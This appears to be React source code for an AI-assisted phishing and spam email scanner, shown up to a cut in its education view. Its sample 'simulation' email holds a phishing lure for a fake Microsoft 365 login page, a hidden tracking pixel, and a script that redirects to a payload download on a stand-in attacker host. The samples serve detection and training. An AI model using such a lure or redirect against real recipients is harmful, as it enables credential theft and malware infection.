import React, { useState, useEffect, useRef } from "react";
import ReactDOM from "react-dom/client";
import { GoogleGenAI } from "@google/genai";

// --- Types ---

type Verdict = "SAFE" | "SUSPICIOUS" | "MALICIOUS";
type SpamCategory = "LEGITIMATE" | "MARKETING" | "NEWSLETTER" | "SCAM" | "UNKNOWN";

interface AnalysisResult {
  verdict: Verdict;
  riskScore: number; // 0 to 100
  confidence: number; // 0 to 100
  summary: string;
  spamAnalysis: {
    isSpam: boolean;
    spamScore: number; // 0-100
    category: SpamCategory;
    indicators: string[];
  };
  riskDimensions: {
    technical: number; // 0-100
    content: number; // 0-100
    social: number; // 0-100
    reputation: number; // 0-100
  };
  technicalAnalysis: {
    domainReputation: string;
    authenticationChecks: string;
  };
  passiveAnalysis: {
    hasTrackingPixels: boolean;
    hasDangerousAttachments: boolean;
    hasScriptsOrIframes: boolean;
    details: string;
  };
  socialEngineering: {
    tacticsUsed: string[];
    urgencyLevel: "LOW" | "MEDIUM" | "HIGH";
  };
  webIntelligence: string; // Findings from Google Search
  recommendations: string[];
}

interface GroundingSource {
  title: string;
  uri: string;
}

// --- Sample Data for Simulation ---

const SAMPLE_PHISHING_EMAIL = `Delivered-To: target@company.com
Received: from mail.secure-server-update-88.com (unknown [192.0.2.14])
        by mx.google.com with ESMTPS id ...
Return-Path: <security-alert@secure-server-update-88.com>
From: "IT Security Support" <security-alert@secure-server-update-88.com>
Subject: URGENT: Microsoft 365 Password Expiry Notice
Date: ${new Date().toUTCString()}
To: target@company.com
Content-Type: multipart/alternative; boundary="0000000000009c8e2b05d1234567"

--0000000000009c8e2b05d1234567
Content-Type: text/html; charset="UTF-8"

<html>
  <body>
    <!-- HIDDEN TRACKING PIXEL: Signals to attacker that email was opened -->
    <img src="http://tracker-analytics-bad-actor.com/pixel.png?id=target@company.com" width="1" height="1" style="display:none;" />
    
    <p>ATTENTION USER,</p>
    <p>Our system monitoring indicates that your Microsoft 365 password is set to expire in 2 hours.</p>
    
    <p><a href="http://microsoft-auth-portal-secure-login.com/auth?id=8832">REACTIVATE ACCOUNT NOW</a></p>
    
    <script>
      // MALICIOUS SCRIPT ATTEMPT (Usually blocked by modern clients, but dangerous in vulnerable ones)
      window.location='http://exploit-kit-download.com/payload.exe';
    </script>
  </body>
</html>`;

// --- Components ---

const Icons = {
  ShieldCheck: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>,
  ShieldAlert: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>,
  Search: () => <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>,
  Globe: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>,
  Trash: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>,
  Cpu: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="4" y="4" width="16" height="16" rx="2" ry="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>,
  Bug: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m8 2 1.88 1.88"/><path d="M14.12 3.88 16 2"/><path d="M9 7.13v-1a3.003 3.003 0 1 1 6 0v1"/><path d="M12 20c-3.3 0-6-2.7-6-6v-3a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v3c0 3.3-2.7 6-6 6"/><path d="M12 20v-9"/><path d="M6.53 9C4.6 8.8 3 7.1 3 5"/><path d="M6 13H2"/><path d="M3 21c0-2.1 1.7-3.9 3.8-4"/><path d="M20.97 5c0 2.1-1.6 3.8-3.5 4"/><path d="M22 13h-4"/><path d="M17.2 17c2.1.1 3.8 1.9 3.8 4"/></svg>,
  BookOpen: () => <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>,
  ChartBar: () => <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg>,
  Zap: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>,
  Wifi: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>,
  Activity: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>,
  Terminal: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>,
  EyeOff: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>,
  Lock: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>,
  AlertOctagon: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
};

// --- Styles ---

const styles = {
  container: {
    maxWidth: "1400px",
    margin: "0 auto",
    padding: "0 2rem 2rem 2rem",
    minHeight: "100vh",
    display: "flex",
    flexDirection: "column" as const,
  },
  header: {
    padding: "1.5rem 0",
    marginBottom: "2rem",
    borderBottom: "1px solid var(--border-color)",
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between"
  },
  title: {
    fontSize: "2rem",
    fontWeight: "700",
    color: "#fff",
    letterSpacing: "-0.05em",
    display: "flex",
    alignItems: "center",
    gap: "0.75rem",
    textTransform: "uppercase" as const,
  },
  nav: {
    display: "flex",
    gap: "0.5rem",
    marginBottom: "2rem",
  },
  navButton: (active: boolean) => ({
    background: active ? "var(--accent-cyber)" : "transparent",
    color: active ? "#000" : "var(--text-secondary)",
    border: active ? "1px solid var(--accent-cyber)" : "1px solid var(--border-color)",
    padding: "0.75rem 1.5rem",
    borderRadius: "4px",
    cursor: "pointer",
    fontWeight: "700",
    display: "flex",
    alignItems: "center",
    gap: "0.5rem",
    transition: "all 0.2s ease",
    textTransform: "uppercase" as const,
    fontSize: "0.9rem",
  }),
  card: {
    background: "var(--bg-panel)",
    border: "1px solid var(--border-color)",
    padding: "1.5rem",
    boxShadow: "0 0 20px rgba(0,0,0,0.5)",
    borderRadius: "8px",
    marginBottom: "1rem",
  },
  inputCard: {
    background: "var(--bg-panel)",
    border: "1px solid var(--border-color)",
    padding: "0",
    borderRadius: "4px",
    height: "100%",
    display: "flex",
    flexDirection: "column" as const,
    position: "relative" as const,
    overflow: "hidden",
  },
  inputHeader: {
    background: "#1a1a1a",
    padding: "0.75rem 1rem",
    borderBottom: "1px solid var(--border-color)",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    fontSize: "0.8rem",
    color: "var(--text-secondary)",
  },
  inputFooter: {
    background: "#1a1a1a",
    padding: "0.5rem 1rem",
    borderTop: "1px solid var(--border-color)",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    fontSize: "0.7rem",
    color: "#555",
    fontFamily: "monospace",
  },
  textarea: {
    width: "100%",
    height: "100%",
    minHeight: "300px",
    background: "#0a0a0a",
    border: "none",
    padding: "1rem",
    color: "var(--accent-cyber)",
    fontFamily: "monospace",
    fontSize: "0.9rem",
    resize: "none" as const,
    outline: "none",
    flex: 1,
  },
  button: {
    background: "var(--accent-cyber)",
    color: "#000",
    border: "none",
    padding: "1rem 2rem",
    fontWeight: "700",
    cursor: "pointer",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: "0.5rem",
    textTransform: "uppercase" as const,
    letterSpacing: "0.05em",
    transition: "all 0.2s",
    borderRadius: "4px",
    width: "100%",
    marginTop: "1rem",
    fontSize: "1rem",
  },
  buttonOutline: {
    background: "transparent",
    color: "var(--accent-cyber)",
    border: "1px solid var(--accent-cyber)",
    padding: "1rem 2rem",
    fontWeight: "700",
    cursor: "pointer",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: "0.5rem",
    textTransform: "uppercase" as const,
    letterSpacing: "0.05em",
    transition: "all 0.2s",
    borderRadius: "4px",
    width: "100%",
    marginTop: "1rem",
  },
  gaugeContainer: {
    position: "relative" as const,
    width: "200px",
    height: "100px",
    margin: "0 auto",
    overflow: "hidden",
  },
  gaugeBody: (score: number) => ({
    width: "200px",
    height: "200px",
    background: `conic-gradient(from 180deg, var(--accent-safe) 0deg 60deg, var(--accent-warning) 60deg 120deg, var(--accent-danger) 120deg 180deg, transparent 180deg)`,
    borderRadius: "50%",
    transform: "rotate(0deg)", // Base rotation
    position: "absolute" as const,
    top: 0,
    left: 0,
    mask: "radial-gradient(transparent 60%, black 61%)",
    WebkitMask: "radial-gradient(transparent 60%, black 61%)",
  }),
  gaugeNeedle: (score: number) => ({
    width: "2px",
    height: "95px",
    background: "#fff",
    position: "absolute" as const,
    left: "50%",
    bottom: "0",
    transformOrigin: "bottom center",
    transform: `rotate(${ (score / 100) * 180 - 90 }deg)`,
    transition: "transform 1s cubic-bezier(0.1, 1.2, 0.3, 1)",
    boxShadow: "0 0 5px rgba(255,255,255,0.8)"
  }),
  ticker: {
    background: "#000",
    borderBottom: "1px solid var(--accent-cyber)",
    color: "var(--accent-cyber)",
    padding: "0.5rem",
    whiteSpace: "nowrap" as const,
    overflow: "hidden",
    fontSize: "0.8rem",
    fontFamily: "monospace",
    marginBottom: "1rem",
  },
  systemStatus: {
    border: "1px solid var(--border-color)",
    background: "#0a0a0a",
    padding: "1rem",
    borderRadius: "4px",
    marginTop: "0",
    height: "100%",
  },
  statusRow: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "0.75rem 0",
    borderBottom: "1px solid #222",
    fontSize: "0.85rem",
    color: "#ccc"
  },
  dot: (active: boolean) => ({
    width: "8px",
    height: "8px",
    borderRadius: "50%",
    background: active ? "var(--accent-safe)" : "#333",
    boxShadow: active ? "0 0 5px var(--accent-safe)" : "none",
    display: "inline-block",
    marginRight: "0.5rem",
    animation: active ? "pulse 2s infinite" : "none"
  }),
  sandboxBanner: {
    background: "rgba(0, 243, 255, 0.05)",
    border: "1px solid var(--accent-cyber)",
    borderRadius: "4px",
    padding: "0.75rem",
    marginBottom: "1rem",
    display: "flex",
    alignItems: "center",
    gap: "1rem",
    fontSize: "0.85rem",
    color: "var(--accent-cyber)"
  }
};

// --- Visualization Components ---

const RiskRadar = ({ dimensions }: { dimensions: AnalysisResult['riskDimensions'] }) => {
  // Center is 100,100, Radius 80
  const c = 100;
  const r = 80;
  
  // Calculate points
  // Order: Technical (Top), Content (Right), Social (Bottom), Reputation (Left)
  const p1 = `${c},${c - (dimensions.technical / 100) * r}`;
  const p2 = `${c + (dimensions.content / 100) * r},${c}`;
  const p3 = `${c},${c + (dimensions.social / 100) * r}`;
  const p4 = `${c - (dimensions.reputation / 100) * r},${c}`;
  
  const polygonPoints = `${p1} ${p2} ${p3} ${p4}`;

  return (
    <div style={{ position: "relative", width: "200px", height: "200px", margin: "0 auto" }}>
       <svg width="200" height="200" viewBox="0 0 200 200">
         {/* Background Grid */}
         <circle cx="100" cy="100" r="20" fill="none" stroke="#333" strokeDasharray="2,2"/>
         <circle cx="100" cy="100" r="40" fill="none" stroke="#333" strokeDasharray="2,2"/>
         <circle cx="100" cy="100" r="60" fill="none" stroke="#333" strokeDasharray="2,2"/>
         <circle cx="100" cy="100" r="80" fill="none" stroke="#444" />
         
         {/* Axes */}
         <line x1="100" y1="20" x2="100" y2="180" stroke="#333" />
         <line x1="20" y1="100" x2="180" y2="100" stroke="#333" />
         
         {/* Labels */}
         <text x="100" y="15" textAnchor="middle" fill="#888" fontSize="10">TECHNICAL</text>
         <text x="190" y="105" textAnchor="start" fill="#888" fontSize="10">CONTENT</text>
         <text x="100" y="195" textAnchor="middle" fill="#888" fontSize="10">SOCIAL</text>
         <text x="10" y="105" textAnchor="end" fill="#888" fontSize="10">REPUTATION</text>
         
         {/* Data Polygon */}
         <polygon points={polygonPoints} fill="rgba(0, 243, 255, 0.3)" stroke="var(--accent-cyber)" strokeWidth="2" />
         <circle cx={c} cy={c - (dimensions.technical / 100) * r} r="3" fill="#fff" />
         <circle cx={c + (dimensions.content / 100) * r} cy={c} r="3" fill="#fff" />
         <circle cx={c} cy={c + (dimensions.social / 100) * r} r="3" fill="#fff" />
         <circle cx={c - (dimensions.reputation / 100) * r} cy={c} r="3" fill="#fff" />
       </svg>
    </div>
  );
};

const DonutChart = ({ data, title }: { data: { label: string, value: number, color: string }[], title: string }) => {
  let accumulatedAngle = 0;
  return (
    <div style={{ textAlign: "center" }}>
      <h4 style={{ color: "#aaa", fontSize: "0.9rem", marginBottom: "1rem" }}>{title}</h4>
      <div style={{ position: "relative", width: "160px", height: "160px", margin: "0 auto" }}>
        <svg width="100%" height="100%" viewBox="0 0 100 100" style={{ transform: "rotate(-90deg)" }}>
          {data.map((slice, i) => {
             const angle = (slice.value / 100) * 360;
             const largeArc = angle > 180 ? 1 : 0;
             const x = 50 + 40 * Math.cos((Math.PI * angle) / 180);
             const y = 50 + 40 * Math.sin((Math.PI * angle) / 180);
             
             // SVG Path for arc
             const pathData = `M 50 50 L 90 50 A 40 40 0 ${largeArc} 1 ${x} ${y} Z`;
             
             const rotation = `rotate(${accumulatedAngle} 50 50)`;
             accumulatedAngle += angle;
             
             return (
               <path key={i} d={pathData} fill={slice.color} transform={rotation} stroke="#0f0f0f" strokeWidth="2" />
             );
          })}
          <circle cx="50" cy="50" r="25" fill="#0f0f0f" />
        </svg>
      </div>
      <div style={{ marginTop: "1rem", display: "flex", flexWrap: "wrap", justifyContent: "center", gap: "0.5rem" }}>
        {data.map((slice, i) => (
           <div key={i} style={{ display: "flex", alignItems: "center", fontSize: "0.7rem", color: "#ccc" }}>
              <span style={{ width: "8px", height: "8px", background: slice.color, borderRadius: "50%", marginRight: "4px" }}></span>
              {slice.label}
           </div>
        ))}
      </div>
    </div>
  );
};

const TrendChart = () => {
  // Simple polyline chart
  return (
    <div style={{ width: "100%", height: "150px", marginTop: "1rem", position: "relative" }}>
       <svg width="100%" height="100%" viewBox="0 0 400 150" preserveAspectRatio="none">
          {/* Grid lines */}
          <line x1="0" y1="150" x2="400" y2="150" stroke="#333" strokeWidth="1" />
          <line x1="0" y1="100" x2="400" y2="100" stroke="#222" strokeWidth="1" strokeDasharray="4,4" />
          <line x1="0" y1="50" x2="400" y2="50" stroke="#222" strokeWidth="1" strokeDasharray="4,4" />
          
          {/* Spam Trend (Yellow) */}
          <polyline 
             points="0,120 50,110 100,125 150,90 200,80 250,95 300,70 350,60 400,50" 
             fill="none" 
             stroke="var(--accent-warning)" 
             strokeWidth="2" 
          />
          
          {/* Phishing Trend (Red) */}
          <polyline 
             points="0,140 50,135 100,130 150,120 200,110 250,90 300,40 350,45 400,30" 
             fill="none" 
             stroke="var(--accent-danger)" 
             strokeWidth="2" 
          />
       </svg>
       <div style={{ display: "flex", justifyContent: "space-between", fontSize: "0.7rem", color: "#666", marginTop: "0.5rem" }}>
          <span>JAN</span><span>FEB</span><span>MAR</span><span>APR</span><span>MAY</span><span>JUN</span>
       </div>
       <div style={{ position: "absolute", top: "0", right: "0", display: "flex", gap: "1rem", fontSize: "0.7rem" }}>
          <span style={{ color: "var(--accent-danger)" }}>● Phishing Attacks</span>
          <span style={{ color: "var(--accent-warning)" }}>● Spam/Marketing</span>
       </div>
    </div>
  );
};

// --- Sub-Components ---

const ThreatTicker = () => {
  const items = [
    "[GLOBAL THREATSTREAM]",
    "DETECTED: Zero-Click Exploits in PDF Readers",
    "ALERT: 'Pixel Tracking' usage up 40% in marketing spam",
    "STATUS: Passive Defense Protocols Active",
    `UPDATED: ${new Date().toLocaleTimeString()}`, 
    "WARNING: Malicious <script> tags found in HTML emails",
    "INTEL: Drive-by download vectors patching required",
    "MONITORING: Silent Execution Attempts"
  ];

  return (
    <div style={styles.ticker}>
      <div className="marquee-content">
        {items.map((item, i) => (
          <span key={`a-${i}`} style={{ display: "inline-flex", alignItems: "center" }}>
            {item}
          </span>
        ))}
        {items.map((item, i) => (
          <span key={`b-${i}`} style={{ display: "inline-flex", alignItems: "center" }}>
            {item}
          </span>
        ))}
      </div>
    </div>
  );
};

const SystemStatusPanel = () => {
  return (
    <div style={styles.systemStatus}>
      <h3 style={{ marginTop: 0, color: "var(--text-secondary)", fontSize: "0.9rem", letterSpacing: "1px", display: "flex", alignItems: "center", gap: "0.5rem" }}>
        <Icons.Cpu /> SYSTEM DIAGNOSTICS
      </h3>
      
      <div style={styles.statusRow}>
        <span><div style={styles.dot(true)}></div>Gemini 2.5 Flash Engine</span>
        <span style={{color: "var(--accent-safe)"}}>ONLINE</span>
      </div>
      <div style={styles.statusRow}>
        <span><div style={styles.dot(true)}></div>Passive Threat Scanner</span>
        <span style={{color: "var(--accent-safe)"}}>ACTIVE</span>
      </div>
      <div style={styles.statusRow}>
        <span><div style={styles.dot(true)}></div>Sandbox Environment</span>
        <span style={{color: "var(--accent-safe)"}}>SECURE</span>
      </div>
      <div style={styles.statusRow}>
        <span><div style={styles.dot(true)}></div>Pixel Tracking Detect</span>
        <span style={{color: "var(--accent-safe)"}}>READY</span>
      </div>
      <div style={styles.statusRow}>
        <span><div style={styles.dot(true)}></div>Spam Classifier</span>
        <span style={{color: "var(--accent-safe)"}}>READY</span>
      </div>

      <div style={{ marginTop: "2rem" }}>
        <h4 style={{ fontSize: "0.8rem", color: "#666", marginBottom: "0.5rem" }}>NETWORK ACTIVITY</h4>
        <div style={{ display: "flex", gap: "2px", alignItems: "flex-end", height: "40px" }}>
          {[...Array(20)].map((_, i) => (
             <div key={i} style={{ 
               width: "100%", 
               background: "var(--accent-cyber)", 
               opacity: 0.3,
               height: `${Math.random() * 100}%`,
               transition: "height 0.5s ease"
             }}></div>
          ))}
        </div>
      </div>
      
      <div style={{ marginTop: "2rem", border: "1px dashed #333", padding: "1rem", borderRadius: "4px" }}>
        <div style={{ fontSize: "0.7rem", color: "#666", marginBottom: "0.5rem" }}>SYSTEM LOG</div>
        <div style={{ fontSize: "0.7rem", fontFamily: "monospace", color: "#444", lineHeight: "1.4" }}>
          {'>'} Initializing sandbox...<br/>
          {'>'} Loading zero-click exploit signatures...<br/>
          {'>'} Loading Spam heuristics (Bayesian)...<br/>
          {'>'} Parsing HTML for hidden iframes...<br/>
          {'>'} Waiting for input stream...
        </div>
      </div>
    </div>
  );
};

const ScannerView = ({ 
  emailText, setEmailText, loading, analyzeEmail, loadSample, result, groundingSources 
}: any) => {
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: "1rem" }}>
      <ThreatTicker />
      
      <div style={styles.sandboxBanner}>
        <Icons.Lock />
        <div>
          <strong>SAFE SANDBOX PROTOCOL:</strong> Analysis is performed on raw text. 
          Pasting email content here PREVENTS your email client from rendering pixels, scripts, or auto-downloading attachments. 
          This is the safest way to inspect suspicious mail.
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 380px", gap: "1.5rem", minHeight: "500px" }}>
        
        {/* Left Column: Input Terminal */}
        <div style={{ display: "flex", flexDirection: "column", gap: "1rem" }}>
          <div style={styles.inputCard}>
            <div style={styles.inputHeader}>
              <span style={{ display: "flex", alignItems: "center", gap: "0.5rem", fontWeight: "bold", color: "var(--accent-cyber)" }}>
                <Icons.Terminal /> SECURE_INPUT_TERMINAL
              </span>
              <span style={{ display: "flex", alignItems: "center", gap: "0.5rem" }}>
                <div style={styles.dot(!loading)}></div>
                {loading ? "PROCESSING STREAM..." : "AWAITING INPUT"}
              </span>
            </div>
            
            <textarea
              style={styles.textarea}
              placeholder="// PASTE RAW EMAIL HEADERS AND BODY HERE FOR DEEP INSPECTION..."
              value={emailText}
              onChange={(e) => setEmailText(e.target.value)}
              spellCheck={false}
            />

            {loading && <div className="scan-line"></div>}

            <div style={styles.inputFooter}>
              <span>CHARS: {emailText.length}</span>
              <span>ENCODING: UTF-8</span>
              <span>PROTOCOL: SMTP/IMAP</span>
            </div>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem" }}>
            <button 
              style={loading || !emailText ? {...styles.button, opacity: 0.5, cursor: "not-allowed", background: "#333"} : styles.button} 
              onClick={analyzeEmail}
              disabled={loading || !emailText}
            >
              {loading ? (
                <>
                  <span className="spinner"></span> SCANNING...
                </>
              ) : (
                <>
                  <Icons.Bug /> INITIATE SCAN
                </>
              )}
            </button>
            <button
               style={loading ? {...styles.buttonOutline, opacity: 0.5} : styles.buttonOutline}
               onClick={loadSample}
               disabled={loading}
            >
               LOAD SIMULATION DATA
            </button>
          </div>
        </div>

        {/* Right Column: Status or Results */}
        <div style={{ display: "flex", flexDirection: "column", gap: "1rem" }}>
          
          {!result && <SystemStatusPanel />}

          {result && (
            <>
            <div style={{ ...styles.card, borderColor: result.verdict === "SAFE" ? "var(--accent-safe)" : result.verdict === "SUSPICIOUS" ? "var(--accent-warning)" : "var(--accent-danger)" }}>
               <h3 style={{ marginTop: 0, borderBottom: "1px solid #333", paddingBottom: "1rem", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <span>ANALYSIS REPORT</span>
                  <div style={{ display: "flex", gap: "0.5rem" }}>
                    <span style={{ 
                      color: "#000", 
                      background: result.spamAnalysis.isSpam ? "#aaa" : "var(--accent-cyber)",
                      padding: "0.2rem 0.5rem",
                      borderRadius: "4px",
                      fontSize: "0.7rem",
                      fontWeight: "bold"
                    }}>
                      {result.spamAnalysis.isSpam ? "SPAM" : "NOT SPAM"}
                    </span>
                    <span style={{ 
                      color: "#000", 
                      background: result.verdict === "SAFE" ? "var(--accent-safe)" : result.verdict === "SUSPICIOUS" ? "var(--accent-warning)" : "var(--accent-danger)",
                      padding: "0.2rem 0.5rem",
                      borderRadius: "4px",
                      fontSize: "0.7rem",
                      fontWeight: "bold"
                    }}>
                      {result.verdict}
                    </span>
                  </div>
               </h3>

               <div style={{ marginTop: "1.5rem" }}>
                  <strong style={{ color: "var(--text-secondary)", fontSize: "0.8rem", letterSpacing: "1px" }}>EXECUTIVE SUMMARY</strong>
                  <p style={{ lineHeight: "1.6", color: "#ddd", fontSize: "0.9rem" }}>{result.summary}</p>
               </div>
               
               {/* Spam Specifics */}
               <div style={{ marginTop: "1rem", padding: "0.5rem", background: "#1a1a1a", borderRadius: "4px", display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: "0.8rem" }}>
                  <span style={{color: "#888"}}>Classification: <strong style={{color: "#fff"}}>{result.spamAnalysis.category}</strong></span>
                  <span style={{color: "#888"}}>Spam Score: <strong style={{color: result.spamAnalysis.spamScore > 50 ? "var(--accent-warning)" : "var(--accent-safe)"}}>{result.spamAnalysis.spamScore}/100</strong></span>
               </div>

               {/* Risk Radar */}
               <div style={{ marginTop: "2rem", textAlign: "center" }}>
                  <strong style={{ color: "var(--text-secondary)", fontSize: "0.8rem", letterSpacing: "1px" }}>RISK VECTOR RADAR</strong>
                  <RiskRadar dimensions={result.riskDimensions} />
               </div>

               {/* Passive Threat Section */}
               <div style={{ marginTop: "1.5rem", background: "rgba(255,255,255,0.05)", padding: "1rem", borderRadius: "4px", borderLeft: result.passiveAnalysis.hasTrackingPixels || result.passiveAnalysis.hasScriptsOrIframes ? "3px solid var(--accent-danger)" : "3px solid var(--accent-safe)" }}>
                 <strong style={{ color: "var(--text-secondary)", fontSize: "0.8rem", letterSpacing: "1px", display: "flex", alignItems: "center", gap: "0.5rem" }}>
                   <Icons.EyeOff /> PASSIVE & ZERO-CLICK THREATS
                 </strong>
                 <p style={{ fontSize: "0.85rem", color: "#ccc", marginTop: "0.5rem" }}>
                   {result.passiveAnalysis.details}
                 </p>
                 <div style={{ display: "flex", gap: "0.5rem", marginTop: "0.5rem", flexWrap: "wrap" }}>
                    {result.passiveAnalysis.hasTrackingPixels && <span style={{fontSize: "0.7rem", color: "#000", background: "var(--accent-warning)", padding: "2px 6px", borderRadius: "2px"}}>TRACKING PIXEL DETECTED</span>}
                    {result.passiveAnalysis.hasScriptsOrIframes && <span style={{fontSize: "0.7rem", color: "#fff", background: "var(--accent-danger)", padding: "2px 6px", borderRadius: "2px"}}>MALICIOUS SCRIPT</span>}
                    {(!result.passiveAnalysis.hasTrackingPixels && !result.passiveAnalysis.hasScriptsOrIframes) && <span style={{fontSize: "0.7rem", color: "#000", background: "var(--accent-safe)", padding: "2px 6px", borderRadius: "2px"}}>NO PASSIVE TRIGGERS</span>}
                 </div>
               </div>
             </div>

             <div style={styles.card}>
                <div style={{ textAlign: "center", marginBottom: "1rem", fontSize: "0.9rem", color: "#888" }}>PHISHING PROBABILITY</div>
                <div style={styles.gaugeContainer}>
                  <div style={styles.gaugeBody(result.riskScore)}></div>
                  <div style={styles.gaugeNeedle(result.riskScore)}></div>
                </div>
                <div style={{ textAlign: "center", fontSize: "2.5rem", fontWeight: "bold", marginTop: "0.5rem", color: "#fff" }}>
                  {result.riskScore}<span style={{fontSize: "1rem", color: "#666"}}>/100</span>
                </div>
             </div>
            </>
          )}
          
        </div>
      </div>
    </div>
  );
};

const EducationView = () => {
  const [hoveredPart, setHoveredPart] = useState<string | null>(null);

  // Email parts data
  const emailParts = [
    { id: "pixel", label: "<img src='tracker.com/pixel.png' ... > (Hidden)", risk: "HIGH", info: "TRACKING PIXEL: This 1x1 invisible image loads automatically when you open the email. It tells the attacker your IP address, location, and that your email is active." },
    { id: "sender", label: "FROM: Support <admin@g00gle-security.com>", risk: "HIGH", info: "Check the sender domain! 'g00gle-security.com' is NOT 'google.com'. Look for misspellings or unofficial domains." },
    { id: "subject", label: "SUBJECT: URGENT: Final Warning!!", risk: "MED", info: "Phishers use 'Urgency' (Urgent, Final Warning, Immediate Action) to make you panic and act without thinking." },
